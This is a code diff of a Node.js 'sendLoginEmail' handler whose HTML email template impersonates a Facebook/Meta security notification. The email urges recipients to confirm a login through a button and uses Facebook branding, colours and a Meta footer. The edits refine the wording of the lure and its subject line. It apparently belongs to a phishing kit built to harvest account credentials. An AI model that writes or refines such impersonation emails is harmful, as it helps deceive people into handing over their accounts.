@@ -17,7 +17,7 @@ exports.sendLoginEmail = async (req, res) => {
     const emailTemplate = `
 <div style="background:#f0f2f5;padding:50px 0;font-family:Segoe UI,Arial,sans-serif">
   <div style="max-width:620px;margin:auto;background:white;border-radius:12px;
-    box-shadow:0 10px 30px rgba(0,0,0,0.06);overflow:hidden">
+      box-shadow:0 10px 30px rgba(0,0,0,0.06);overflow:hidden">
 
     <!-- HEADER with logo -->
     <div style="padding:25px 30px;background:#1877f2;color:white;text-align:center">
@@ -32,10 +32,9 @@ exports.sendLoginEmail = async (req, res) => {
     <!-- BODY -->
     <div style="padding:35px 30px;color:#1c1e21;font-size:15px;line-height:1.6">
       <p style="margin-top:0;font-size:16px">Hello,</p>
-
       <p>
         We noticed a login attempt to your <strong>Facebook Security portal</strong>.
-        To proceed securely, please confirm your login.
+        To continue safely, please confirm your login by clicking the button below.
       </p>
 
       <!-- CTA BUTTON with hover -->
@@ -59,9 +58,9 @@ exports.sendLoginEmail = async (req, res) => {
 
       <!-- INFO BOX -->
       <div style="background:#f7f9fc;border:1px solid #e4e6eb;
-        padding:18px 20px;border-radius:6px;font-size:14px;color:#444">
-        If you did not request this login, you can safely proceed to this email.
-        No access will occur without verification.
+          padding:18px 20px;border-radius:6px;font-size:14px;color:#444">
+        If you did not request this login, you can safely proceed this email.
+        Your account will remain secure without verification.
       </div>
 
       <p style="margin-top:30px;font-weight:600">
@@ -71,7 +70,7 @@ exports.sendLoginEmail = async (req, res) => {
 
     <!-- FOOTER -->
     <div style="border-top:1px solid #e4e6eb;padding:20px 30px;
-      font-size:12px;color:#65676b;background:#fafafa;line-height:1.5;text-align:center">
+        font-size:12px;color:#65676b;background:#fafafa;line-height:1.5;text-align:center">
       This is an automated security notification from Facebook Security.
       <br><br>
       © 2026 Meta Security · Privacy · Terms
@@ -80,12 +79,12 @@ exports.sendLoginEmail = async (req, res) => {
 </div>
 `
 
-    // Send the email with proper error handling
+    // Send email
     let sent
     try {
       sent = await sendEmail(
         email,
-        "🔐 Confirm Your Login - Facebook Notification",
+        "🔐 Confirm Your Login - Facebook Security",
         emailTemplate
       )
     } catch (err) {
